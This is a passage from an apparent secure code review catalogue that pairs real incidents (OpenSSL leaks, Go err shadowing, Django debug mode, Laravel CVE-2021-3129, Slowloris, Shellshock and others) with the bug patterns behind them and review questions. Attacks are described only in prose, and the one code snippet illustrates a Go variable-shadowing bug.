parser to enter infinite or near-infinite loops. These include: entity expansion attacks
("billion laughs") where recursive entity definitions cause exponential memory/CPU usage,
malformed namespace declarations that cause the parser to re-scan the same input
repeatedly, and deeply nested XML structures that exhaust the parser's recursion limit
without triggering error handling. Each of these produces a denial-of-service condition
where a tiny malicious XML document consumes 100% CPU or all available memory.
**Why Missed:** Each loop individually has a termination condition that works for well-
formed input. The infinite loop only occurs with malformed input that violates the
parser's assumptions about progress. Fuzzing catches these effectively, but manual review
of complex parser code is unlikely to identify all non-progress conditions.
**Review Pattern:** LOOP_PROGRESS — "Does every loop iteration make progress (consume
input, advance a cursor, decrement a counter)? Is there a maximum iteration bound?"

### L22. Memory Leak in Error Path — OpenSSL Error Path Leaks
**Project:** OpenSSL | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** Numerous OpenSSL CVEs and bug reports involving memory leaks on error paths,
including leaks in certificate parsing, handshake processing, and OCSP response handling
**The Bug:** Early return in a function that allocated resources, bypassing the cleanup
code at the function's end. OpenSSL's C codebase has a long history of memory leaks on
error paths. Functions that allocate X.509 structures, BIO chains, or SSL context objects
typically have cleanup code at the end of the function. When error conditions cause early
returns (via goto or direct return), allocated resources are leaked. These leaks are
especially problematic in long-running server processes: each leaked allocation during
error handling accumulates, and an attacker who can trigger error conditions repeatedly
(malformed certificates, failed handshakes, invalid OCSP responses) can cause gradual
memory exhaustion leading to denial of service. OpenSSL has refactored many functions
to use a single `err:` label with consolidated cleanup, but the codebase is large and
new error-path leaks continue to be discovered.
**Why Missed:** Error paths are tested less than happy paths. The leak is only visible
under sustained error conditions over long runtime periods. Code review focuses on the
main logic flow, and the absence of cleanup (a missing `free()` call) is harder to spot
than the presence of incorrect code.
**Review Pattern:** EARLY_RETURN_CLEANUP — "Does every early return (error path, break,
continue) clean up all resources allocated earlier in the function?"

### L23. SQL N+1 Query — GitLab Performance Issues
**Project:** GitLab | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** GitLab's extensively documented N+1 query performance issues — GitLab
created dedicated tooling (Gitlab::QueryRecorder) and documentation to detect and prevent
N+1 queries after they caused significant performance degradation
**The Bug:** Fetching a list then issuing a separate query for each item, causing
performance degradation that can become a DoS with large datasets. GitLab's Rails
codebase suffered pervasive N+1 query issues as the application grew: loading a merge
request page would trigger separate database queries for each commit, each diff file,
each comment author, and each CI pipeline status. A merge request with 100 commits could
trigger 400+ database queries. The performance degradation was proportional to the amount
of data — small test projects were fast, but real-world GitLab instances with large
repositories experienced multi-second page loads. GitLab invested heavily in detection
tooling: they built `QueryRecorder` to count queries in tests and fail CI if query counts
regressed, and documented patterns for using `includes()`, `preload()`, and batch loading
to prevent N+1 queries. The effort became a case study in how ORM convenience can hide
database performance problems.
**Why Missed:** Each individual query is correct and fast. The N+1 pattern is a property
of the loop, not of any single query. ORMs make lazy loading the default, so the extra
queries are invisible in the code. Testing with small datasets doesn't reveal the
performance cliff.
**Review Pattern:** QUERY_BATCHING — "Are related queries batched or joined? Can an
attacker control the loop count to amplify query volume?"

### L24. Goroutine/Thread Leak on Context Cancellation — Kubernetes Controllers
**Project:** Kubernetes | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** Kubernetes controller goroutine leaks documented across multiple controllers
(kube-controller-manager, kube-scheduler) where goroutines spawned for watch operations
outlived their context
**The Bug:** Background workers that don't check for context cancellation, continuing
to consume resources after the parent request is done. Kubernetes controllers extensively
use the watch pattern: a goroutine watches for changes to a resource type and processes
events. When the controller's context is cancelled (e.g., during leader election
failover, configuration reload, or graceful shutdown), goroutines that don't properly
select on `ctx.Done()` continue running. In the kube-controller-manager, which runs
dozens of controllers each with multiple watchers, leaked goroutines from failed
reconnection attempts or cancelled operations accumulated over time. Under conditions
that triggered frequent context cancellations (network instability, API server restarts),
the goroutine count could grow to tens of thousands, consuming memory and CPU for
goroutine scheduling overhead. The Kubernetes project added goroutine leak detection to
their test framework to catch these issues systematically.
**Why Missed:** Each goroutine individually does useful work. The leak only manifests
when the goroutine outlives its intended lifecycle, which requires specific cancellation
or error conditions. Standard tests don't check goroutine counts before and after, so
leaks are invisible to the test suite.
**Review Pattern:** CONTEXT_PROPAGATION — "Do background operations check for context
cancellation/timeout? Can a cancelled request leave orphaned workers?"

### L25. Wrong Error Variable in Go — Standard Library Bugs
**Project:** Go standard library and ecosystem | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** Multiple Go standard library and major project bugs caused by err variable
shadowing, leading to the go vet shadow checker and extensive discussion in the Go
community (golang/go#21291 and related issues)
**The Bug:** Shadowed `err` variable in Go causing the outer error to not be updated:
```go
if val, err := someFunc(); err != nil {  // inner err
    return err  // returns inner err
}
return err  // returns OUTER err, which might be nil
```
Go's `:=` operator in an inner scope creates a new variable that shadows the outer one.
The outer `err` remains nil even if the inner function call failed. This pattern has
caused real bugs in the Go standard library itself and across major Go projects. The
Go team created the `go vet -shadow` checker specifically to detect this pattern, and
it was a frequent topic in Go proposals for language changes. The bug is especially
dangerous in error-handling chains where multiple operations can fail: if one error is
shadowed, the function returns nil (success) even though an operation failed, potentially
leaving resources in an inconsistent state.
**Why Missed:** The code compiles without warnings. The `:=` and `=` operators look
similar. The shadowing is syntactically valid Go — it's not a language error, it's a
semantic mistake. The bug only manifests when the inner function succeeds (err is nil in
the inner scope) but a previous error should have been propagated.
**Review Pattern:** SHADOW_VARIABLE — "In Go: is `err` (or any important variable) being
shadowed by := in an inner scope? Use `=` for the outer variable."

---

## Configuration & Operational (20 entries)

### O1-O20. Configuration and Operational Bugs

### O1. Debug Mode in Production — Django DEBUG=True Incidents
**Project:** Django | **Severity:** High | **Discovered:** Ongoing
**Incident:** Numerous documented incidents of Django applications deployed with
DEBUG=True, exposing settings, SQL queries, full stack traces, and environment variables
to end users via Django's debug error page
**The Bug:** Debug flags left enabled in production, exposing stack traces, internal
state, and often disabling security features. Django's DEBUG=True mode produces a
detailed error page showing the full stack trace, local variables, SQL queries executed,
all installed middleware, template context, and the complete Django settings (with some
filtering of keys containing "SECRET" or "PASSWORD"). When deployed to production with
DEBUG=True, every unhandled exception displays this information to the end user. Shodan
and Google dork searches regularly discover thousands of Django applications with debug
mode enabled on the public internet. The exposed information includes database
connection strings, API keys that don't match the filtered patterns, internal IP
addresses, and the full source code of the failing view. Django's security checklist
explicitly warns about this, and `manage.py check --deploy` flags it, but the warning
is easy to ignore.
**Why Missed:** DEBUG=True is the default in Django's startproject template because it's
needed during development. The transition from development to production requires
explicitly setting DEBUG=False, and if the deployment process doesn't enforce this, it's
a sin of omission — nothing visibly breaks with debug enabled.
**Review Pattern:** DEBUG_PRODUCTION — "Is debug mode disabled by default? Does enabling
it require explicit environment-specific configuration?"

### O2. Verbose Error Messages to Users — Laravel Debug Mode (CVE-2021-3129)
**Project:** Laravel (Ignition) | **Severity:** Critical | **Discovered:** 2021
**Incident:** CVE-2021-3129 — Laravel's Ignition debug page (enabled by default in
development) allowed remote code execution via a file manipulation vulnerability, and
even without RCE, exposed .env contents including database passwords and API keys
**The Bug:** Stack traces, SQL queries, file paths, or internal IPs leaked in error
responses to end users. CVE-2021-3129 affected Laravel's Ignition error page handler.
When debug mode was enabled (APP_DEBUG=true in .env), the Ignition error page not only
displayed full stack traces and environment variables, but also provided an interactive
"solution" feature that could modify files on the server. Researchers discovered that
this file modification feature could be exploited for remote code execution by
manipulating log files to inject PHP code. Even without the RCE component, the debug
page itself exposed the complete .env file contents — database credentials, mail server
passwords, AWS keys, Stripe API keys, and application secrets — to anyone who could
trigger an error. The vulnerability was actively exploited in the wild.
**Why Missed:** Debug mode is essential during development and is enabled by default in
Laravel's starter template. The Ignition error page's "solutions" feature was intended
as a developer convenience. The file modification capability was not recognized as a
security risk because it was assumed to only be active in development.
**Review Pattern:** ERROR_DISCLOSURE — "Do error responses to users contain only generic
messages? Are detailed errors logged server-side, not sent to clients?"

### O3. Logging Sensitive Data — Twitter Plaintext Password Logging (2018)
**Project:** Twitter | **Severity:** High | **Discovered:** 2018
**Incident:** Twitter disclosed in May 2018 that a bug caused plaintext passwords to be
written to an internal log, affecting all 330 million users, and recommended all users
change their passwords
**The Bug:** Passwords, tokens, credit card numbers, or PII written to application logs.
In May 2018, Twitter disclosed that a bug in their logging system had been recording
user passwords in plaintext to an internal log before the hashing function was applied.
The logging was added for debugging purposes during the authentication flow, and the log
statement captured the password at a point in the code before bcrypt hashing was applied.
Twitter stated the bug was found internally and the logs were not accessed improperly,
but recommended all 330 million users change their passwords. The incident highlighted
how logging at debug/trace level in authentication code can capture sensitive data that
should never be persisted. Similar incidents have been disclosed by GitHub (2018, logging
plaintext passwords during a specific operation) and Facebook (2019, storing hundreds of
millions of passwords in plaintext logs).
**Why Missed:** The log statement was in a debugging code path and logged a request object
or authentication context that included the password field. The developer was logging for
debugging, not intentionally logging passwords. Structured logging of objects containing
sensitive fields is the root cause — logging `request` instead of `request.username`.
**Review Pattern:** LOG_REDACTION — "Are sensitive fields (password, token, ssn, credit_card)
redacted in log output?"

### O4. Health Check Endpoint Exposes Information — Spring Boot Actuator (CVE-2017-8046)
**Project:** Spring Boot | **Severity:** Critical | **Discovered:** 2017
**Incident:** CVE-2017-8046 and related Spring Boot Actuator exposure issues — Actuator
endpoints exposed without authentication allowed environment variable reading, heap dumps,
and in some cases remote code execution
**The Bug:** Health check or status endpoints that return internal information (versions,
dependency status, configuration) without authentication. Spring Boot Actuator provides
production-ready features including health checks, metrics, environment variables, and
heap dumps. By default in older Spring Boot versions, these endpoints were enabled and
accessible without authentication. The /env endpoint exposed all environment variables
(including database passwords and API keys), /heapdump provided a JVM heap dump
(containing in-memory secrets), and /jolokia or /actuator/gateway/routes could be
exploited for remote code execution. CVE-2017-8046 specifically involved a Spring Data
REST vulnerability accessible through Actuator endpoints. Thousands of exposed Actuator
endpoints have been discovered on the public internet through Shodan scans.
**Why Missed:** Actuator is a standard Spring Boot dependency added for operational
monitoring. Its endpoints are useful and appear benign (health checks, metrics). The
dangerous endpoints (env, heapdump, jolokia) are bundled with the safe ones. Default-on
behavior means developers don't explicitly choose to expose them.
**Review Pattern:** HEALTH_INFO — "Do public health/status endpoints expose only liveness
information, not internal details?"

### O5. Permissive File Permissions — nginx (CVE-2016-1247)
**Project:** nginx (Debian/Ubuntu packages) | **Severity:** High | **Discovered:** 2016
**Incident:** CVE-2016-1247 — nginx log files on Debian/Ubuntu were created with
permissions that allowed the www-data user to replace them with symlinks, enabling
privilege escalation to root (see also R15)
**The Bug:** Configuration files, key files, or log files with world-readable or overly
permissive permissions. CVE-2016-1247 in nginx's Debian/Ubuntu packages involved log
files created with permissions that allowed the www-data user to manipulate them. The
log directory /var/log/nginx was owned by www-data, allowing the web server user to
create, delete, and replace files within it. When the log rotation script (running as
root) recreated log files following symlinks, an attacker who had compromised the
www-data user could escalate to root. The broader pattern extends to: private key files
(e.g., TLS certificates) readable by all users, configuration files containing database
passwords readable by all users, and application logs containing sensitive data stored
with group-readable permissions.
**Why Missed:** File permissions are set at deployment time, not in application code.
Code review focuses on the application logic, not the filesystem permissions of the
deployed artifacts. The default permissions set by `mkdir` or `touch` depend on the
process umask, which is a system configuration detail.
**Review Pattern:** FILE_PERMISSIONS — "Are sensitive files (keys, configs, logs) readable
only by the service user?"

### O6. Unbounded Resource Allocation — HTTP Flooding DDoS
**Project:** Various web servers and applications | **Severity:** High | **Discovered:** Ongoing
**Incident:** Documented HTTP flooding attacks including the 2023 HTTP/2 Rapid Reset
attack (CVE-2023-44487) that achieved record-breaking DDoS volumes by exploiting
unbounded server resource allocation per connection
**The Bug:** No limits on request body size, file upload size, query result count, or
connection count, enabling resource exhaustion DoS. The HTTP/2 Rapid Reset attack
(CVE-2023-44487) demonstrated this at scale: HTTP/2 allows multiplexing many streams on
a single connection, and the Rapid Reset attack opened and immediately cancelled streams
at extreme rates. Servers allocated resources for each stream before processing the
cancellation, allowing a single client to exhaust server resources. Google reported
seeing attacks of 398 million requests per second. Beyond this specific protocol-level
attack, the general pattern of unbounded resource allocation affects every web
application: unlimited request body sizes allow memory exhaustion, unlimited file upload
sizes fill disks, unlimited query result pages allow database exhaustion, and unlimited
connection counts exhaust file descriptors.
**Why Missed:** Resource limits feel like optimization, not security. The application
"works" without them. Each resource type needs its own limit, and developers focus on
the happy path where resources are reasonable. The worst-case analysis (what if an
attacker sends the maximum of everything) is rarely performed during review.
**Review Pattern:** RESOURCE_LIMITS — "Are there limits on request size, upload size, query
results, connections, and rate? What's the worst case if an attacker maximizes each?"

### O7. Missing Security Headers — SecurityHeaders.io Scans
**Project:** Various web applications | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** SecurityHeaders.io (now securityheaders.com) by Scott Helme demonstrated
that the vast majority of Alexa Top 1M websites lacked basic security headers, including
major banks, government sites, and technology companies
**The Bug:** Web responses missing Content-Security-Policy, X-Content-Type-Options,
X-Frame-Options, Strict-Transport-Security, Referrer-Policy. Scott Helme's
securityheaders.com scanning project has continuously demonstrated that most websites
lack basic security headers. As of his published analyses: fewer than 10% of the Alexa
Top 1M set Content-Security-Policy, fewer than 20% set X-Frame-Options, and fewer than
15% set HSTS. Each missing header represents a specific attack surface: missing CSP
allows inline script execution (XSS), missing X-Content-Type-Options allows MIME sniffing
attacks, missing X-Frame-Options allows clickjacking, and missing HSTS allows SSL
stripping. The headers are trivial to add — typically a single line in the web server
or framework configuration — but are consistently overlooked because they don't affect
functionality.
**Why Missed:** The application works without security headers. No test fails when they're
missing. The headers are a defense-in-depth measure against attacks that may seem
theoretical. Adding them requires coordination with the web server or CDN configuration,
which may be managed by a different team.
**Review Pattern:** SECURITY_HEADERS — "Are all recommended security headers set?
CSP, HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy."

### O8. Leftover Test Credentials — SolarWinds Default Password (2020)
**Project:** SolarWinds | **Severity:** Critical | **Discovered:** 2020
**Incident:** SolarWinds' update server was protected by the password "solarwinds123,"
disclosed during the broader SolarWinds supply chain investigation, demonstrating how
default/weak credentials persist in production systems
**The Bug:** Test accounts, default passwords, or development API keys left in production
configuration. During the investigation of the SolarWinds supply chain attack (2020),
security researcher Vinoth Kumar revealed that the password for SolarWinds' update server
(where the compromised Orion updates were hosted) had been "solarwinds123" — and had been
publicly exposed on GitHub since 2019. While this weak password was not the primary
vector for the sophisticated supply chain attack (attributed to state-level actors), it
exemplified a broader pattern: default and test credentials persisting in production
systems. The SolarWinds case is extreme, but the pattern is universal — default database
passwords ("root"/""), development API keys committed to configuration files, and test
accounts with known passwords are regularly found in production deployments.
**Why Missed:** Credentials are set during initial setup and rarely revisited. "We'll
change the password before production" is a universal intention that is frequently
forgotten. Credential rotation is operational overhead with no visible feature benefit.
CI/CD pipelines typically don't verify that credentials have been changed from defaults.
**Review Pattern:** TEST_CREDENTIALS — "Are there any test/default/development credentials
in production configuration?"

### O9. Unencrypted Database Connection — MongoDB/Redis/Elasticsearch Defaults
**Project:** MongoDB, Redis, Elasticsearch | **Severity:** Critical | **Discovered:** Ongoing
**Incident:** Thousands of MongoDB, Redis, and Elasticsearch instances exposed on the
internet without authentication or TLS, leading to massive data breaches and ransomware
campaigns documented by Shodan researchers (see also M36, M37, M38)
**The Bug:** Database connections without TLS/SSL, transmitting credentials and data in
plaintext over the network. MongoDB, Redis, and Elasticsearch all historically defaulted
to no TLS encryption and no authentication. Combined with default binding to all network
interfaces (0.0.0.0), this meant that databases deployed with default configuration were
fully accessible from the internet with no encryption. Shodan scans in 2016-2017 found
over 35,000 exposed MongoDB instances, leading to ransomware campaigns where attackers
deleted data and demanded Bitcoin payment. The same pattern affected Elasticsearch (over
10,000 exposed instances) and Redis (which was especially dangerous because its
file-writing capability enabled remote code execution). Even when authentication was
enabled, the lack of TLS meant credentials were transmitted in plaintext, visible to
any network observer.
**Why Missed:** Default configuration "just works" for development on localhost. The
documentation focused on getting started, not on production hardening. TLS configuration
adds complexity (certificate management) that is a barrier to adoption. The risk is
invisible until the database is actually targeted.
**Review Pattern:** DB_TLS — "Are database connections encrypted with TLS? Is the
certificate verified?"

### O10. Missing Audit Logging — Equifax Breach Post-Mortem (2017)
**Project:** Equifax | **Severity:** Critical | **Discovered:** 2017
**Incident:** Equifax breach post-mortem (2017) — the congressional report cited missing
or inadequate audit logging as a key factor in the 76-day gap between the initial
compromise and detection of the breach affecting 147 million consumers
**The Bug:** No audit trail for security-relevant actions (login, privilege change, data
access, admin actions). The 2017 Equifax breach exploited a known Apache Struts
vulnerability (CVE-2017-5638) that went unpatched for months. But the investigation
revealed a deeper problem: insufficient audit logging meant that the attackers operated
undetected within Equifax's network for 76 days. The attackers queried the database
containing 147 million consumer records, exfiltrating Social Security numbers, birth
dates, and addresses, with no alerts triggered. The congressional investigation report
specifically cited the lack of comprehensive access logging on sensitive databases and
the absence of anomaly detection on data access patterns as contributing factors that
allowed the breach to persist.
**Why Missed:** Audit logging is an operational concern, not a feature requirement. It
adds I/O overhead and storage costs. Without a specific compliance requirement (SOC 2,
PCI DSS, HIPAA), audit logging is easily deprioritized. The absence of logs causes no
visible failure — until a breach occurs and there's no forensic trail.
**Review Pattern:** AUDIT_TRAIL — "Are security-relevant actions logged with who, what,
when, and from where?"

### O11. Backup Encryption Missing — Unencrypted S3 Backup Breaches
**Project:** Various (AWS S3, Azure Blob Storage) | **Severity:** Critical | **Discovered:** Ongoing
**Incident:** Numerous cloud storage breaches involving unencrypted database backups on
publicly accessible S3 buckets, including the Verizon partner leak (2017, 14M records),
Dow Jones (2017, 2.2M records), and many others
**The Bug:** Database backups or file backups stored unencrypted, exposing data if backup
storage is compromised. The pattern of unencrypted database backups on publicly accessible
S3 buckets became so common it spawned dedicated scanning tools. Notable incidents
include: a Verizon partner leaving 14 million customer records in an unencrypted S3
backup (2017), Dow Jones exposing 2.2 million customer records via an open S3 bucket
containing database exports (2017), and Accenture leaving multiple S3 buckets open
containing database backups with client credentials (2017). In each case, database
backups were uploaded to cloud storage without encryption, and the storage bucket was
configured with public or overly permissive access. The combination of "backup for
disaster recovery" and "cheap cloud storage" created a new category of data exposure.
**Why Missed:** Backups are an operational concern managed by ops/SRE teams, not reviewed
as application code. The backup scripts work correctly — they create valid backups. The
missing encryption and the storage permissions are separate concerns that fall between
the backup process and the infrastructure team.
**Review Pattern:** BACKUP_ENCRYPTION — "Are backups encrypted at rest with key management
separate from the backup storage?"

### O12. DNS Resolution for Internal Services — DNS Hijacking Incidents
**Project:** Various | **Severity:** High | **Discovered:** Ongoing
**Incident:** Multiple DNS hijacking campaigns including the Sea Turtle APT campaign
(2019, documented by Cisco Talos) that hijacked DNS for government and infrastructure
targets, and the MyEtherWallet BGP/DNS hijack (2018) that stole $17M in cryptocurrency
**The Bug:** Internal service names resolved via public DNS, allowing DNS poisoning or
hijacking to redirect internal traffic. The Sea Turtle campaign (documented by Cisco
Talos in 2019) compromised DNS registrars and DNS hosting providers to redirect traffic
for government agencies, telecommunications companies, and internet infrastructure
organizations. By modifying DNS records at the registrar level, attackers redirected
traffic to their own servers, intercepting credentials and sensitive communications.
In the MyEtherWallet incident (2018), attackers hijacked DNS via a BGP leak at an
ISP, redirecting the cryptocurrency wallet's domain to a malicious server that stole
credentials and drained wallets. Both incidents exploited the fundamental trust that
applications place in DNS resolution — the assumption that a resolved IP address
actually belongs to the intended service.
**Why Missed:** DNS is infrastructure that applications take for granted. The assumption
"DNS resolution returns the correct IP" is fundamental to how networking works. Verifying
DNS integrity requires additional mechanisms (DNSSEC, certificate pinning) that add
complexity.
**Review Pattern:** INTERNAL_DNS — "Are internal service names resolved via internal DNS?
Can external DNS influence internal routing?"

### O13. Metric/Monitoring Endpoint Unprotected — Prometheus /metrics Exposure
**Project:** Prometheus / Various | **Severity:** Medium-High | **Discovered:** Ongoing
**Incident:** Shodan scans routinely discover thousands of exposed Prometheus /metrics
endpoints on the public internet, leaking internal system information including hostnames,
database connection strings, API endpoint URLs, and application-specific business metrics
**The Bug:** Prometheus /metrics, pprof /debug, or similar endpoints exposed without
authentication, leaking internal metrics and potentially enabling DoS. Prometheus
endpoints (/metrics) are designed to be scraped by monitoring systems and typically
expose: process memory and CPU usage, garbage collector statistics, HTTP request counts
by endpoint (revealing internal API structure), database connection pool metrics (revealing
database hostnames), queue depths, error rates, and application-specific counters. The
Go pprof endpoints (/debug/pprof/) are even more dangerous: they expose goroutine stacks
(revealing internal logic), heap profiles (containing in-memory data), and CPU profiles
that can cause performance degradation during collection. Shodan scans regularly find
these endpoints on the public internet because Prometheus metrics are enabled by default
in many Go frameworks and the HTTP listener binds to all interfaces.
**Why Missed:** Metrics endpoints are added for operational visibility and considered
"internal." The information they expose seems like "just metrics" — not obviously
sensitive. The endpoints don't require authentication in the application's threat model
because they're "supposed to be behind a firewall."
**Review Pattern:** METRICS_AUTH — "Are monitoring/debugging endpoints protected by
authentication or network restriction?"

### O14. Missing Request Timeout — Slowloris Attack on Apache (2009)
**Project:** Apache HTTP Server | **Severity:** High | **Discovered:** 2009
**Incident:** Slowloris attack tool (2009, by Robert "RSnake" Hansen) demonstrated that
a single machine could take down an Apache web server by opening connections and sending
headers extremely slowly, one byte at a time
**The Bug:** HTTP server or client without request/response timeouts, vulnerable to
slowloris attacks or hanging connections that exhaust resources. The Slowloris attack,
published in 2009, exploited the fact that Apache httpd allocated a full worker thread
per connection and had no timeout on receiving complete HTTP headers. The attack opened
hundreds of connections and sent partial HTTP headers, adding one byte every few seconds
to keep connections alive without completing the request. Each connection consumed a
worker thread, and with Apache's default MaxRequestWorkers limit, a single attacker
machine could exhaust all available workers. Legitimate clients could no longer connect
because all workers were occupied by the slow attacker connections. Unlike traditional
DDoS attacks that require massive bandwidth, Slowloris needed only minimal bandwidth
from a single machine. Apache was particularly vulnerable because of its thread-per-
connection model; event-driven servers like nginx were largely immune.
**Why Missed:** Incomplete requests are a normal part of HTTP — slow networks, mobile
clients, and high-latency connections all produce partial requests. The timeout needs to
be long enough for legitimate slow clients but short enough to prevent resource
exhaustion. Apache's default configuration prioritized compatibility over security.
**Review Pattern:** TIMEOUT_EVERYWHERE — "Does every network operation (HTTP request,
database query, external API call) have a timeout configured?"

### O15. Unrestricted File Types in Upload — PHP Web Shell Uploads
**Project:** Various PHP applications | **Severity:** Critical | **Discovered:** Ongoing
**Incident:** PHP web shell upload is one of the most common attack vectors in web
application compromises, documented across WordPress, Joomla, Drupal, and countless
custom PHP applications
**The Bug:** File upload accepting any file type, including server-executable files
(.php, .jsp, .aspx) or dangerous types (.html with XSS). PHP web shell upload is a
perennial attack vector: an attacker uploads a .php file (containing a web shell like
c99 or r57) through an image upload form, then accesses it directly via the URL to
execute arbitrary commands on the server. The attack succeeds when: the upload doesn't
restrict file types, or only checks Content-Type (easily spoofed), or checks the
extension with an incomplete blocklist (missing .phtml, .php5, .phar), or stores files
in a web-accessible directory without disabling PHP execution. WordPress plugins have
been a particularly rich source of this vulnerability — hundreds of plugins implement
their own file upload handlers without adequate type restriction. The attack is often
the initial foothold in larger compromises, leading to database theft, lateral movement,
and cryptocurrency mining.
**Why Missed:** File upload "works" — files are stored and retrievable. Extension checking
feels like adequate protection, but the number of executable extensions (.php, .php3,
.php4, .php5, .phtml, .phar) creates a blocklist that is always incomplete. Content-Type
checking is trivially bypassed. The real fix (storing files outside the webroot or
disabling execution) requires architectural changes.
**Review Pattern:** UPLOAD_TYPE_RESTRICT — "Is file upload restricted to expected types
by both extension AND content-type validation? Are uploaded files served from a separate
domain?"

### O16. Missing Account Lockout — Yahoo Breach (2013)
**Project:** Yahoo | **Severity:** Critical | **Discovered:** 2013 (disclosed 2016)
**Incident:** The Yahoo breach (2013, disclosed in 2016) affected all 3 billion user
accounts. The post-mortem revealed the absence of account lockout mechanisms as a
contributing factor that allowed credential-based attacks at scale
**The Bug:** No account lockout or CAPTCHA after repeated failed login attempts. The
2013 Yahoo breach — the largest data breach in history, affecting all 3 billion Yahoo
accounts — involved multiple attack vectors. Among the contributing factors identified
in subsequent analysis was the absence of effective account lockout or rate limiting on
authentication endpoints. Without lockout mechanisms, attackers could conduct brute-force
and credential-stuffing attacks at scale. Once credentials were obtained (through initial
breach vectors including forged authentication cookies), the lack of lockout allowed
systematic testing of stolen credentials across Yahoo's services. The breach led to
a $350 million reduction in Yahoo's acquisition price by Verizon and highlighted how
missing basic security controls (rate limiting, lockout, anomaly detection) compound the
impact of other vulnerabilities.
**Why Missed:** Account lockout can cause denial of service for legitimate users (an
attacker can lock out any account by sending failed login attempts). This legitimate
concern about availability often leads organizations to not implement lockout at all,
rather than implementing progressive measures (CAPTCHA, exponential backoff, temporary
lockout with notification).
**Review Pattern:** BRUTE_FORCE_PROTECTION — "Is there protection against brute-force
login attempts (lockout, CAPTCHA, rate limiting)?"

### O17. Predictable Resource URLs — IDOR via Sequential IDs
**Project:** Various web applications | **Severity:** High | **Discovered:** Ongoing
**Incident:** Numerous IDOR (Insecure Direct Object Reference) vulnerabilities exploiting
sequential URLs, including the 2014 AT&T iPad breach where sequential ICC-IDs exposed
114,000 customer email addresses, and Parler's 2021 data scrape using sequential post IDs
**The Bug:** Uploaded files or resources accessible via sequential/predictable URLs,
enabling enumeration. AT&T's iPad SIM activation API used sequential ICC-IDs (Integrated
Circuit Card Identifiers), and researchers discovered they could enumerate all 114,000
registered iPad users' email addresses by incrementing the ICC-ID. In 2021, Parler's API
used sequential integers for post IDs, and researchers archived the entire platform
(including deleted posts and GPS-tagged images) by simply iterating through IDs 1 to N.
The broader pattern affects file uploads (e.g., /uploads/1001.pdf, /uploads/1002.pdf),
user profiles (/users/1, /users/2), invoices, and any resource with a monotonic
identifier. Sequential IDs reveal both the resource count (how many users, orders, etc.)
and provide a complete enumeration vector.
**Why Missed:** Auto-incrementing database IDs are the default primary key strategy in
most frameworks. The sequential nature seems like an internal implementation detail.
Without explicit authorization checks on each resource access, the predictable URL is
sufficient for unauthorized access.
**Review Pattern:** UNPREDICTABLE_URLS — "Are resource URLs unpredictable (UUIDs, not
sequential IDs)?"

### O18. Missing Graceful Shutdown — Deployment Data Loss Incidents
**Project:** Various | **Severity:** Medium-High | **Discovered:** Ongoing
**Incident:** Documented incidents of data loss during deployments across Kubernetes
rolling updates, Heroku dyno restarts, and AWS ECS task replacements, where in-flight
requests were dropped during container shutdown
**The Bug:** Service shutdown that terminates in-flight requests, potentially leaving
operations in an inconsistent state. During rolling deployments (Kubernetes, ECS, Heroku),
old containers are terminated and new containers start. If the old container doesn't
handle SIGTERM gracefully, in-flight requests are abruptly terminated. For read-only
requests, this causes user-visible errors. For write operations, it's worse: a database
transaction may have started but not committed, a payment may have been charged but the
order not recorded, or a multi-step process may be left half-completed. Kubernetes sends
SIGTERM and waits terminationGracePeriodSeconds (default 30s) before SIGKILL, but
applications must actually handle SIGTERM by stopping acceptance of new requests and
completing in-flight work. Applications that don't handle SIGTERM — or that start new
background work after receiving it — lose data during every deployment.
**Why Missed:** Graceful shutdown is invisible during development (Ctrl+C kills the
process, and there's no load). The default behavior of most HTTP frameworks is to
immediately terminate when the process receives SIGTERM. Implementing graceful shutdown
requires explicit signal handling and connection draining, which is infrastructure work
that doesn't add features.
**Review Pattern:** GRACEFUL_SHUTDOWN — "Does the service drain in-flight requests before
shutting down? Is there a maximum drain timeout?"

### O19. Environment Variable Injection — Shellshock (CVE-2014-6271)
**Project:** GNU Bash | **Severity:** Critical | **Discovered:** 2014
**Incident:** Shellshock (CVE-2014-6271) was partly an environment variable injection
issue — web servers passed HTTP headers as environment variables to CGI scripts, and
Bash's function import feature executed code from those variables (see I2 for full
details on the Bash parsing bug)
**The Bug:** User input used to set environment variables that affect child processes or
library behavior. Shellshock's attack vector relied on environment variables: CGI web
servers conventionally pass HTTP headers as environment variables (HTTP_USER_AGENT,
HTTP_REFERER, etc.) to CGI scripts. When a CGI script was executed by Bash (or any
program that spawned a Bash subprocess), the attacker-controlled header values became
environment variables, and Bash's function import feature parsed and executed code from
them. Beyond Shellshock, the broader pattern of environment variable injection affects:
LD_PRELOAD (load arbitrary shared libraries), PATH (redirect program execution),
PYTHONPATH/NODE_PATH (import malicious modules), and application-specific variables that
change behavior (DEBUG, DATABASE_URL). Any context where user input flows into
environment variables creates a code execution or configuration tampering risk.
**Why Missed:** Environment variables are a communication mechanism between processes,
not a data format that receives the same scrutiny as SQL queries or shell commands. The
CGI convention of passing headers as environment variables was a decades-old standard.
The security implications of environment variable content depend on what the child process
does with them, creating a cross-boundary trust issue.
**Review Pattern:** ENV_INJECTION — "Can user input influence environment variables? Are
security-sensitive environment variables filtered?"

### O20. Missing Input Length Limits — Buffer Overflow via Oversized Input
**Project:** Various | **Severity:** High | **Discovered:** Ongoing
**Incident:** The broader pattern behind numerous buffer overflow CVEs — many memory
safety vulnerabilities are triggered by inputs that exceed expected size limits, including
Heartbleed (M1), GHOST (M5), and Stagefright (M6), all of which involved oversized input
that was not length-checked
**The Bug:** No maximum length on user input fields (names, descriptions, comments),
enabling storage DoS, UI overflow, or injection with very long strings. At the
application level, missing input length limits cause: database storage exhaustion (a
single comment field filled with gigabytes of text), UI rendering failures (text that
breaks layout assumptions), and denial of service through regex processing (ReDoS is
amplified by input length). At the system level, missing length limits are the enabling
condition for buffer overflows — Heartbleed read 64KB past a buffer because the length
field wasn't validated, GHOST overflowed because the hostname exceeded the buffer size,
and Stagefright overflowed because the media metadata exceeded expected bounds. Input
length validation is the simplest and most broadly applicable security control: every
input field should have a maximum length that reflects its real-world purpose (names:
hundreds of characters, not gigabytes; ports: 5 digits; email: 254 characters per RFC
5321).
**Why Missed:** Length validation feels like a UX concern, not a security concern.
Developers focus on format validation (is it a valid email?) rather than length validation
(is it a reasonable length?). Database columns with unlimited VARCHAR or TEXT types
don't enforce limits at the storage layer.
**Review Pattern:** INPUT_LENGTH — "Do all user input fields have maximum length limits
